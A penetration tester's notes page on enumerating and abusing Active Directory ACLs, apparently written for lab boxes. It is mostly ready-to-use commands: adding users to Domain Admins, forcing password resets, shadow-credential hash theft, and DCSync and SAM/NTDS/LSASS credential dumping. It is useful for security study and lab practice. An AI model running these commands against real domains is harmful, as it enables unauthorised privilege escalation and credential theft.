Typically, [[Bloodhound (legacy)]] can be sufficient...

There may be scenarios in which BloodHound SUCKS. In which case you may have to manually enumerate Access Control Entries (ACEs) domain users, and groups to see what rights they have over other users.
## ACL Enumeration

Before proceeding, note that you should probably start enumerating users you have control over...

Enumerating ACLs of Users OR Groups with PowerView
```powershell
# PowerView
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid "<user> OR <group>"
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# What if -ResolveGUIDs doesn't work?
$guid= "<GUID>"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```

Enumerating ACLs of Users with Get-ACL (if we cant use PowerView)
```PowerShell
# Create List of Domain Users
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

# foreach Loop to find ACL of specific user
foreach($line in [System.IO.File]::ReadLines("C:\path\to\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match '<domain>\\<user>'}}
```

Enumerating Groups
```PowerShell
# Enumerate group info
Get-DomainGroup -Identity "<group>" 

# Find parent group
| select memberof
```

LINUX -- bloodyAD or dacledit


This can be useful if a user is a member of a group that INHERITS its parent's group rights

After Enumerating, you can proceed to ACL Attacks
## ACL Attacks

| ACE                 | Cmdlet                                          |
| ------------------- | ----------------------------------------------- |
| ForceChangePassword | Set-DomainUserPassword                          |
| Add Members         | Add-DomainGroupMember                           |
| GenericAll          | Set-DomainUserPassword or Add-DomainGroupMember |
| GenericWrite        | Set-DomainObject                                |
| WriteOwner          | Set-DomainObjectOwner                           |
| WriteDACL           | Add-DomainObjectACL                             |
| AllExtendedRights   | Set-DomainUserPassword or Add-DomainGroupMember |
| AddSelf             | Add-DomainGroupMember                           |
This is a table of commonly abused ACEs and the corresponding PowerShell Cmdlet that may be leveraged to abuse them

Googling these will demonstrate the proper workflow... Below are some common scenarios I have run into.

#### GenericWrite
If we have GenericWrite, we can add users to groups
	`net rpc` might work when `net group` fails
```bash
# net rpc method (linux)

net rpc group addmem "Domain Admins" "<Target_User>" -U '<domain>'/'<controlled_user>'%'<password>' -S <dc_ip>


# BloodyAD method
# Add user to group
bloodyAD --host "<dc_ip>" -d "<domain>" -u "<controlled_user>" -p "<password>" add groupMember "Domain Admins" "<user>"
# Get NTLM of user in group
certipy shadow auto -u <user_we_control>@<domain> -p <pass> -account <target_acct>



# net group method (windows)

net group "domain admins" <user> /add /domain # /domain if it is a domain group


# powershell method

powershell -ep bypass
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<user>' -Credential $Cred
```

#### GenericAll (Group Priv Abuse)

If a principal you have owned belongs to a group/OU which is hierarchically ABOVE another, you can force a password reset of users in that group

This can be done remotely
```bash
# force pass reset via RPC
rpcclient -N  <ip_address> -U '<controlled_user>%<pass>'
$> setuserinfo2 <victim> 23 'Password123!'

# net rpc version (from kali)
net rpc password "TargetUser" "Password123!" -U "DOMAIN"/"ControlledUser"%"Password" -S <dc_ip>
```
if this fails, consider resetting box (this happened to me before)

#### DCSync (Dumping)
A DCSync is where we impersonate a DC and ask a victim DC to send across a copy of its data like SAM, NTDS, etc... The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right.

impacket-secretsdump see [[Credential Dumping]]
	requires user account with adequate privs
	if using -hashes, format is LMHASH:NTHASH. you can just provide the NTLM hash like this
	`:<NTLM_HASH>`
```bash
# locally

impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> -ntds <NTDS.dit> LOCAL

# Remotely

impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target>

```

netexec
	requires user account with adequate privs
```bash
#domain hashes
nxc smb <ip> -u <user> -p <pass> --ntds

#local hashes
nxc smb <ip> -u <user> -p <pass> --sam
```


Not a DCSync but still dumping
If we have a .dmp file, we can dump with pypykatz
```bash
pypykatz lsa minidump lsass.dmp
```
